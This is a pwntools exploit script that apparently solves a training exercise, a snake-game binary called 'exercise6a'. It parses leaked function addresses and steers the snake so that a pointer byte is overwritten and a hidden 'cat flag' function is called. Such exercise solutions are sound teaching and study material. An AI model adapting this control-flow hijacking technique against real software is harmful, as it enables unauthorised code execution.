#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def get_addr(data):
    regex = r"good_bye\s*(\S*)\nuncallable (\S*)"
    reg = re.findall(regex, data)
    if len(reg) != 1:
        raise Exception("Didn't get one hit: {reg}")
    return reg[0]

def parse_snake(data_str):
    regex_snake = r"snake: (\S* \S*)"
    reg_snake = re.findall(regex_snake, data_str)
    return reg_snake[0]

def reached_len(data_str, len=44):
    regex_fruit = r"fruit: (\S* \S*)"
    regex_snake_len = r"snake length: (\S*)"
    reg_fruit = re.findall(regex_fruit, data_str)
    reg_snake_len = re.findall(regex_snake_len, data_str)
    reg_snake = parse_snake(data_str)
    try:
        if reg_fruit[0] not in reg_snake:
            return False
        return int(reg_snake_len[0]) == len
    except Exception as e:
        print(f"{data_str}")
        exit()

def exploit():
    r = start()
    #proxy = ida.attach(r, "192.168.127.1", ida_start_port=31337, binary_path=context.binary.path)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,
    data_str = r.recvuntil(b"enter:").decode()
    bye_add, unc_add = get_addr(data_str)
    last_byte = int(unc_add[-2:], 16)
    while not reached_len(data_str):
        r.sendline(b"A")
        data_str = r.recvuntil(b"enter:").decode()
    cur_pos = parse_snake(data_str)
    regex_x_pos = r"\((\d*) "
    reg_pos = re.findall(regex_x_pos, cur_pos)
    reg_pos = int(reg_pos[0])
    move = last_byte - reg_pos
    print(f"Cur {cur_pos} with goal {last_byte} move {move}")
    # snake length is pointer to cat flag
    #r.sendline(b'A'*0x100)
    r.sendline(b'd'*move)
    r.sendline(b's'*250)
    #r.recvall(timeout=5)
    r.sendline(b'q')
    print(r.recvall(timeout=2).decode())

for i in range(8):
    try:
        exploit()
    except:
        pass
